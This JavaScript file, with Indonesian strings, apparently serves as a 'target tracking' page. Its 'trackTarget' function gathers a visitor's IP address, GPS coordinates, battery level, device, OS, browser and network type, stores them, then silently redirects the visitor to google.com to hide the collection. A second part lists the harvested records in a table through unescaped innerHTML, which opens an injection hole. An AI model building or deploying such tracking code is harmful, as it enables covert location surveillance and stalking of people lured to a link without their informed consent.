function getIP(callback) {
    fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(data => callback(data.ip))
        .catch(error => {
            console.error("Gagal mendapatkan IP:", error);
            callback("Tidak Diketahui");
        });
}

function getBatteryStatus(callback) {
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            const level = Math.round(battery.level * 100) + "%";
            const charging = battery.charging ? "Mengisi" : "Tidak Mengisi";
            callback(level + " (" + charging + ")");
        }).catch(() => callback("Tidak Diketahui"));
    } else {
        callback("Tidak Diketahui");
    }
}

function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        deviceName: getDeviceName(),
        os: getOS(),
        browser: getBrowser(),
        resolution: `${screen.width}x${screen.height}`,
    };
}

function getDeviceName() {
    let ua = navigator.userAgent.toLowerCase();
    if (ua.includes("android")) return "Android Device";
    if (ua.includes("iphone")) return "iPhone";
    if (ua.includes("ipad")) return "iPad";
    if (ua.includes("windows")) return "Windows PC";
    if (ua.includes("mac")) return "Macbook";
    return "Unknown Device";
}

function getOS() {
    let ua = navigator.userAgent.toLowerCase();
    if (ua.includes("windows")) return "Windows";
    if (ua.includes("mac")) return "MacOS";
    if (ua.includes("android")) return "Android";
    if (ua.includes("iphone")) return "iOS";
    return "Unknown OS";
}

function getBrowser() {
    let ua = navigator.userAgent.toLowerCase();
    if (ua.includes("chrome")) return "Google Chrome";
    if (ua.includes("safari") && !ua.includes("chrome")) return "Safari";
    if (ua.includes("firefox")) return "Mozilla Firefox";
    if (ua.includes("edge")) return "Microsoft Edge";
    if (ua.includes("opera") || ua.includes("opr")) return "Opera";
    return "Unknown Browser";
}

function getNetworkInfo() {
    return navigator.connection ? navigator.connection.effectiveType : "Tidak Diketahui";
}

function getGPS(callback) {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            position => {
                callback(`${position.coords.latitude}, ${position.coords.longitude}`);
            },
            () => {
                callback("Tidak Diizinkan");
            }
        );
    } else {
        callback("Tidak Didukung");
    }
}

function trackTarget() {
    getIP(ip => {
        getBatteryStatus(battery => {
            getGPS(gps => {
                const deviceInfo = getDeviceInfo();
                const network = getNetworkInfo();
                const visitTime = new Date().toLocaleString();

                let storedData = JSON.parse(localStorage.getItem("visitorData")) || [];
                storedData.push({ ip, ...deviceInfo, gps, network, battery, visitTime });
                localStorage.setItem("visitorData", JSON.stringify(storedData));

                window.location.href = "https://google.com";
            });
        });
    });
}

function loadStoredData() {
    let storedData = JSON.parse(localStorage.getItem("visitorData")) || [];
    const table = document.getElementById("dataTable");
    table.innerHTML = "";

    storedData.forEach(entry => {
        const row = `<tr>
            <td>${entry.ip}</td>
            <td>${entry.deviceName}</td>
            <td>${entry.os}</td>
            <td>${entry.browser}</td>
            <td>${entry.resolution}</td>
            <td>${entry.gps}</td>
            <td>${entry.network}</td>
            <td>${entry.battery}</td>
            <td>${entry.visitTime}</td>
        </tr>`;
        table.innerHTML += row;
    });
}

function clearData() {
    localStorage.removeItem("visitorData");
    loadStoredData();
}

if (document.getElementById("dataTable")) {
    loadStoredData();
}
